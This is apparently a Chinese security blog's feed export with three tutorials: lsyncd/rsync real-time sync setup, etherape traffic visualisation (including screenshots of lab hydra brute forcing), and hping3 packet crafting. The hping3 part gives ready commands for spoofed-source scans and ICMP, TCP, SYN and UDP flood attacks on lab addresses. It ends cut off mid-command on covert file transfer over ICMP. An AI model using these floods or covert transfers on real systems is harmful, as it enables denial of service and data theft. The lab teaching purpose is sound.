lua lua-devel asciidoc cmake -y</span><br><span class="line"># wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/lsyncd/lsyncd-2.1.5.tar.gz</span><br><span class="line"># tar xf lsyncd-2.1.5.tar.gz</span><br><span class="line"># cd lsyncd-2.1.5/</span><br><span class="line"># ./configure --prefix=/usr/local/lsyncd-2.1.5 &amp;&amp; make &amp;&amp; make install</span><br><span class="line"># echo $? &amp;&amp; cd</span><br><span class="line"># ln -s /usr/local/lsyncd-2.1.5/ /usr/local/lsyncd/</span><br><span class="line"># cd /usr/local/lsyncd/bin/ &amp;&amp; ./lsyncd</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>0x02 关于 <code>lsyncd.conf</code> 配置文件的详细配置及配置项简要说明</p><p><code>settings 部分</code>,其实就是关于lsyncd工具自身的一些选项设置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">logfile   : 指定lsyncd工具本身运行所产生的日志文件存放位置</span><br><span class="line">statusFile  : 定义lsyncd监控目录状态文件的存放位置</span><br><span class="line">statusInterval  : 隔多少秒记录一次被监控目录的状态</span><br><span class="line">nodaemon=true   : 默认是不启用守护模式的</span><br><span class="line">inotifyMode  : 指定要监控的事件,如,CloseWrite,Modify,CloseWrite or Modify</span><br><span class="line">maxProcesses    : 指定同步时进程的最大个数</span><br><span class="line">maxDelays  : 当事件被命中累计多少次后才进行一次同步</span><br></pre></td></tr></table></figure></p><p><code>sync 部分</code>主要用来定义同步时的一些设置,可以同时同步多个目录,只需要在该代码块中事先定义好多个sync即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">default.rsync: 指定lsyncd运行模式,另外,还有default.direct,default.rsyncssh模式,个人建议缺省</span><br><span class="line">source: 指定要监控的目录,务必全部用绝对路径</span><br><span class="line">target: 要同步到的目标目录,一般为rsync服务端模块下指定的目录</span><br><span class="line">init: 为false时表示只同步lsyncd进程启动以后发生改动事件的文件,否则,反之,默认为true</span><br><span class="line">delay: 当命中的事件累计到多少时再触发同步</span><br><span class="line">exclude: 通过此选项排除掉不需要同步的文件,可用它自己的正则进行匹配</span><br><span class="line">delete: 和rsync 的 --delete 作用一样,先清空再同步</span><br></pre></td></tr></table></figure></p><p>下面是关于 <code>rsync 工具自身</code>的一些设置选项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress: 压缩后再同步</span><br><span class="line">bwlimit: 限速同步,当你不想占满带宽时</span><br><span class="line">archive: 归档模式同步</span><br><span class="line">perms: 保留文件原有属性同步</span><br></pre></td></tr></table></figure></p><p>0x03 开始实战配置 <code>lsyncd.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># mkdir -p /usr/local/lsyncd-2.1.5/&#123;var,etc&#125;</span><br><span class="line"># vi /usr/local/lsyncd/etc/lsyncd.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">settings &#123;</span><br><span class="line">    logfile =&quot;/usr/local/lsyncd-2.1.5/var/lsyncd.log&quot;,</span><br><span class="line">    statusFile =&quot;/usr/local/lsyncd-2.1.5/var/lsyncd.status&quot;,</span><br><span class="line">    inotifyMode = &quot;CloseWrite or Modify&quot;,</span><br><span class="line">    maxProcesses = 10,</span><br><span class="line">    statusInterval = 10,</span><br><span class="line">    nodaemon = true,</span><br><span class="line">    maxDelays = 20</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sync &#123;</span><br><span class="line">    default.rsync,</span><br><span class="line">    source = &quot;/bakdata/&quot;,</span><br><span class="line">    target = &quot;rsync_backup@192.168.5.4::webbak&quot;,</span><br><span class="line">    delete=&quot;true&quot;,</span><br><span class="line">    exclude = &#123; &quot;dir*&quot; &#125;,</span><br><span class="line">    delay = 10,</span><br><span class="line">    init = false,</span><br><span class="line">    rsync  = &#123;</span><br><span class="line">bwlimit=200,</span><br><span class="line">        binary = &quot;/usr/bin/rsync&quot;,</span><br><span class="line">        archive = true,</span><br><span class="line">        compress = true,</span><br><span class="line">        verbose = true,</span><br><span class="line">       perms = true,</span><br><span class="line">password_file = &quot;/etc/rsync.password&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x04 加载自定义配置文件,启动lsyncd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/lsyncd/bin/lsyncd -log all /usr/local/lsyncd/etc/lsyncd.conf &amp;&gt;/dev/null &amp;</span><br><span class="line"># echo &quot;/usr/local/lsyncd/bin/lsyncd -log all /usr/local/lsyncd/etc/lsyncd.conf &amp;&gt;/dev/null &amp;&quot; &gt;&gt; /etc/rc.local</span><br><span class="line"># ps -le | grep lsyncd先看下lsyncd进程有没有正常起来</span><br><span class="line"># mkdir /bakdata/lsyncd&#123;1..58&#125;接着,尝试在要同步的目录下批量创建文件,看能不能按指定的时间正常延迟同步</span><br></pre></td></tr></table></figure></p><p>0x05 从日志中仔细观察同步过程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /usr/local/lsyncd/var/lsyncd.log</span><br></pre></td></tr></table></figure></p><p><img src="/img/lsyncd copy.png" alt=""><br><img src="/img/lsyncd copy res.png" alt=""></p><p>0x06 观察监控目录中的事件命中状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># cat /usr/local/lsyncd/var/lsyncd.status</span><br></pre></td></tr></table></figure></p><p><img src="/img/lsyncd status.png" alt=""><br><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,lsyncd 还支持当监控到某个指定事件时就执行什么样的命令,待自己详读官方文档后再做单独说明,由于是通过时间延迟和累计事件命中次数来触发同步,在设计上要优于inotify,更多内容,如果有兴趣大家可自行参考其官方文档,待续…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;br&gt;&lt;br&gt;0x01 关于lsyncd&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;inotify的优秀替代品,基于lua,不过,它也依然使用 linux 2.6.13以后内核的inotify触发机制&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;配置简单灵活,在同步海量小文件时,性能表现优异,废话不多讲,咱们直奔主题&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;环境准备:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;RsyncServer	ip: 192.168.5.4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RsyncClient26 	ip: 192.168.5.7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 在需要进行实时同步的 rsync 客户端机器上&lt;code&gt;[ 这里是RsyncClient26 ]&lt;/code&gt;编译安装lsyncd,如下&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# yum install lua lua-devel asciidoc cmake -y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/lsyncd/lsyncd-2.1.5.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# tar xf lsyncd-2.1.5.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# cd lsyncd-2.1.5/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ./configure --prefix=/usr/local/lsyncd-2.1.5 &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# echo $? &amp;amp;&amp;amp; cd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ln -s /usr/local/lsyncd-2.1.5/ /usr/local/lsyncd/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# cd /usr/local/lsyncd/bin/ &amp;amp;&amp;amp; ./lsyncd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="lsyncd" scheme="https://evil-404.github.io/categories/lsyncd/"/>
    
    
      <category term="lsyncd" scheme="https://evil-404.github.io/tags/lsyncd/"/>
    
  </entry>
  
  <entry>
    <title>纯图形化实时流量分析 [ etherape ]</title>
    <link href="https://evil-404.github.io/2017-11-18-etherape.html"/>
    <id>https://evil-404.github.io/2017-11-18-etherape.html</id>
    <published>2017-11-18T02:16:14.000Z</published>
    <updated>2017-12-05T11:48:54.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于 etherape:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一款纯图形化的网络流量分析工具,既是图形界面,所以系统中务必要有各类图形库支持才行</span><br><span class="line">很多数时候,我们可能只是想简单的看看数据流向,了解总体数据流向或某单个网络节点状况,并不想关心数据包里面到底是什么东西</span><br><span class="line">此时,etherape 则无疑是个比较不错的选择,另外,它对各个协议的支持相对还算比较到位</span><br><span class="line">当然,缺点也是有的,毕竟是实时分析,如果流量瞬间激增,很容易把程序卡崩掉[不知道是有点儿溢出,还是io跟不上],也正常,毕竟只是个小工具肯定没商业工具那么完善</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>0x02 环境:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali ip: 192.168.3.30</span><br><span class="line">centos6.9_x64 ip: 192.168.3.16 [eth1]  192.168.3.19 [eth0]</span><br><span class="line">win2008R2cnip: 192.178.3.23</span><br><span class="line">win7cnip: 192.168.3.2</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>0x03 开始在centos6.9_x64上安装etherape,它同样依赖于libpcap库进行数据捕获,所以,如果你是自行编译安装的,请务必先装好所依赖的各种图形环境,具体请参考其官方说明,  <a href="http://etherape.sourceforge.net/download.shtml#sources" target="_blank" rel="noopener">http://etherape.sourceforge.net/download.shtml#sources</a>   这里就暂以kali平台进行演示,Ubuntu 下其实也是一样的,不再赘述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># apt-get install etherape -y</span><br><span class="line"># etherape -i eth0</span><br></pre></td></tr></table></figure></p><p>0x04 下面是 etherape 所支持的各种数据捕获模式,如,<code>链路模式,ip模式,tcp模式</code>,我们最常用的可能就是ip模式了,非常的直观明了<br><img src="/img/mode etherape.png" alt=""></p><p>0x05 选择要进行捕获的网卡接口,如果你的机器同时有几块网卡,分别连接着不同的vlan,可以选择对指定的vlan进行数据捕获<br><img src="/img/interface etherape.png" alt=""></p><p>0x06 接着,我们就用etherape来简单观察一些典型的网络行为,当然,本身用途绝非仅限于此,对于我们来讲,用的更多的,可能还是分析各种入侵攻击流量,帮助快速定位攻击源,此处要再次强调,它只适合用在流量较小的一些内网环境下,个人觉得,已经很难应用于如今的办公场景,不过,作为学习还是非常有价值的</p><p>在win7cn上尝试用迅雷进行正常的数据下载,注意,不同的颜色代表左侧对应颜色的协议,捕获期间可以随时暂停或直接停止,方便人为进一步分析<br><img src="/img/download.png" alt=""></p><p>在win7cn上用浏览器进行正常的web访问<br><img src="/img/browser https.png" alt=""></p><p>在centos6.9_x64上用超大数据包ping百度<br><img src="/img/ping 65500.png" alt=""></p><p>在kali上对win2008r2cn的rdp使用hydra默认线程进行爆破<br><img src="/img/rdp_crack.png" alt=""></p><p>在kali上对win2008r2cn的smb使用hydra默认线程进行爆破<br><img src="/img/smb_crack.png" alt=""></p><p>在centos6.9_x64上利用hping3快速发送随机源ip的icmp数据包,本来想直接发flood的,因为速度过快,直接把etherape卡崩了,所以不得已才用的–fast选项<br><img src="/img/icmp fast.png" alt=""></p><p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;除了渗透之用,它也一样可以用来帮我们快速定位网络中的各种故障,对于一些网络初学者来讲,更是非常的友好,可以很直观的把各种抽象的网络逻辑用最直观的实时动态绘图表现出来,极易理解,这里就不多啰嗦了,大家有兴趣可以多自行尝试…虽然是个小工具,但不乏大作为 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于 etherape:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;一款纯图形化的网络流量分析工具,既是图形界面,所以系统中务必要有各类图形库支持才行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;很多数时候,我们可能只是想简单的看看数据流向,了解总体数据流向或某单个网络节点状况,并不想关心数据包里面到底是什么东西&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;此时,etherape 则无疑是个比较不错的选择,另外,它对各个协议的支持相对还算比较到位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;当然,缺点也是有的,毕竟是实时分析,如果流量瞬间激增,很容易把程序卡崩掉[不知道是有点儿溢出,还是io跟不上],也正常,毕竟只是个小工具肯定没商业工具那么完善&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 环境:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;kali 			ip: 192.168.3.30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;centos6.9_x64 		ip: 192.168.3.16 [eth1]  192.168.3.19 [eth0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;win2008R2cn		ip: 192.178.3.23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;win7cn			ip: 192.168.3.2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="etherape" scheme="https://evil-404.github.io/categories/etherape/"/>
    
    
      <category term="etherape" scheme="https://evil-404.github.io/tags/etherape/"/>
    
  </entry>
  
  <entry>
    <title>老旧但不乏经典的高级组包工具 [ hping3 ]</title>
    <link href="https://evil-404.github.io/2017-11-15-hping3.html"/>
    <id>https://evil-404.github.io/2017-11-15-hping3.html</id>
    <published>2017-11-15T14:47:48.000Z</published>
    <updated>2017-12-05T11:52:26.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;一款经典的高级组包工具,虽然老旧,但不乏经典,你完全可以利用它任意组装专属的 tcp,udp,icmp 数据报文格式,废话不多说,咱们直奔主题…</p><p>0x01 实验环境:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali ip:192.168.3.38</span><br><span class="line">CentOS6.9 [MidLAMP] ip:192.168.3.16[eth1]  192.168.3.19[eth0]在此机器上编译安装hping3</span><br></pre></td></tr></table></figure></p><p>0x02 编译安装 hping3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># yum install libpcap-devel tcl-devel -y</span><br><span class="line"># wget http://www.hping.org/hping3-20051105.tar.gz</span><br><span class="line"># tar xf hping3-20051105.tar.gz</span><br><span class="line"># cd hping3-20051105</span><br><span class="line"># vi bytesex.h</span><br><span class="line">  || defined(__x86_64__) \为了防止后续编译出错,需要在第一个判断下添加此句,如下图所示,添加64位系统平台</span><br><span class="line"># ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h</span><br><span class="line"># ./configure &amp;&amp; make &amp;&amp; make strip &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><a id="more"></a><p><img src="/img/hping3_error.png" alt=""></p><p>0x03 hping3 各基础选项用途:</p><p>全局选项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-I  指定所使用的网卡接口</span><br><span class="line">-c  指定发包个数</span><br><span class="line">--fast  指定发包速率,每秒10个</span><br><span class="line">--faster 指定发包速率,每秒100个</span><br><span class="line">--flood 指定发包速率,尽可能按最快速度发,不用回应</span><br><span class="line">-E  从指定的文件中读取数据</span><br><span class="line">-e 增加签名,相当于连接&apos;密码&apos;</span><br><span class="line">-B  启用安全协议</span><br><span class="line">-T 启用路由跟踪模式</span><br><span class="line">-d  指定data数据大小,默认为0</span><br><span class="line">-V  显示发包的详细过程</span><br></pre></td></tr></table></figure></p><p>指定发包模式 [默认走的tcp模式]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-0  原始ip模式,即RAWSOCKET</span><br><span class="line">-1  icmp模式</span><br><span class="line">-2  udp模式</span><br><span class="line">-8  扫描模式</span><br><span class="line">-9  被动监听模式,可用于正向shell连接</span><br></pre></td></tr></table></figure></p><p>ip配置选项:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-a伪造源ip</span><br><span class="line">--rand-dest 使用随机目的地址</span><br><span class="line">--rand-source使用随机源地址</span><br><span class="line">-t指定ttl值,默认为64</span><br><span class="line">-f 使用分片发送</span><br></pre></td></tr></table></figure></p><p>icmp配置选项:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-C 指定icmp类型</span><br></pre></td></tr></table></figure></p><p>udp/tcp配置选项:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-s 使用指定的源端口,默认是随机的</span><br><span class="line">-p 指定目的端口</span><br><span class="line">-w 指定数据包大小,默认为64</span><br><span class="line">-F 使用FIN标志</span><br><span class="line">-S 使用SYN标志</span><br><span class="line">-R 使用RST标志</span><br><span class="line">-A 使用ACK标志</span><br><span class="line">-U 使用RUG标志</span><br><span class="line">-P 使用PUSH标志</span><br></pre></td></tr></table></figure></p><p>0x04 常规用法:</p><p>直接ping,注意,默认用的是tcp的<code>ping</code>,而非icmp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 192.168.3.23  </span><br><span class="line"># tcpdump -i eth0 dst host 192.168.3.23</span><br></pre></td></tr></table></figure></p><p><img src="/img/hping common.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -1 192.168.3.23 -c 2</span><br></pre></td></tr></table></figure><p><img src="/img/hping3 icmp.png" alt=""></p><p>使用icmp扫描C段存活主机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># for ipaddr in $(seq 1 254);do hping3 192.168.3.$ipaddr -c 1 -1 &amp; done</span><br></pre></td></tr></table></figure></p><p>伪造各种源信息对目标进行探测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -1 --fast -t 128 -a 192.168.3.128 192.168.3.23 -c 100</span><br><span class="line"># tcpdump -i eth0 icmp</span><br></pre></td></tr></table></figure></p><p><img src="/img/icmp mode.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -t 128 -a 192.168.3.128 192.168.3.23 -c 100 --fast -s 1235 -p 1234 -c 100</span><br><span class="line"># tcpdump -i eth0 tcp dst port 1234</span><br></pre></td></tr></table></figure><p><img src="/img/tcp mode.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -2 --fast -c 30 --rand-source 192.168.3.23</span><br><span class="line"># tcpdump -i eth0 dst 192.168.3.23</span><br></pre></td></tr></table></figure><p><img src="/img/udp mode.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 --fast -c 30 --rand-source 192.168.3.23 -F -S</span><br><span class="line"># tcpdump -i eth0 dst 192.168.3.23</span><br></pre></td></tr></table></figure><p><img src="/img/FIN SYN.png" alt=""></p><p>0x05 尝试利用hping3进行常规 tcp / udp 端口扫描,速度比一般的端口扫描工具确实要快很多:</p><p>指定目标tcp端口范围进行扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -8 70-5500 -S 192.168.3.23 -a 192.168.3.178</span><br><span class="line"># tcpdump -i eth0 dst 192.168.3.23</span><br></pre></td></tr></table></figure></p><p><img src="/img/tcp portscan.png" alt=""></p><p>单个tcp端口扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -8 80,3306 -S 192.168.3.23</span><br><span class="line"># tcpdump -i eth0 dst port 3306</span><br></pre></td></tr></table></figure></p><p><img src="/img/tcp portscan mysql.png" alt=""><br><img src="/img/tcp portscan mysql res.png" alt=""></p><p>多个udp端口扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -2 -8 160-170  192.168.3.23</span><br><span class="line"># tcpdump -i eth0 udp</span><br></pre></td></tr></table></figure></p><p>0x06 基于各种类型的洪水攻击 [ icmp,tcp,syn…udp flood ]:</p><p>icmp flood<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -1 --flood 192.168.3.23 --rand-source基于icmp的简易ddos</span><br><span class="line"># tcpdump -i eth0 icmp</span><br></pre></td></tr></table></figure></p><p><img src="/img/icmp flood.png" alt=""></p><p>tcp flood<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -p 80 --flood 192.168.3.23 --rand-source  最简易的CC攻击效果</span><br><span class="line"># tcpdump -i eth0 dst port 80</span><br></pre></td></tr></table></figure></p><p><img src="/img/tcp flood.png" alt=""><br><img src="/img/tcp flood web res.png" alt=""></p><p>syn flood<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -p 80 -S --flood 192.168.3.23 --rand-source</span><br><span class="line"># tcpdump -i eth0 dst port 80</span><br></pre></td></tr></table></figure></p><p><img src="/img/syn flood.png" alt=""></p><p>syn ack flood<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -p 80 -S -A --flood 192.168.3.23 --rand-source</span><br><span class="line"># tcpdump -i eth0 dst port 80</span><br></pre></td></tr></table></figure></p><p><img src="/img/syn ack flood.png" alt=""></p><p>udp flood<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># hping3 -2 --flood 192.168.3.23 --rand-source</span><br><span class="line"># tcpdump -i eth0 udp</span><br></pre></td></tr></table></figure></p><p><img src="/img/udp flood.png" alt=""></p><p>0x07 利用hping3来传输文件 <code>其实就相当于在利用各种隧道传输数据</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hping3 192.168.3.38 --icmp -d 120 --sign klion --file /etc/issue -c 1 -I 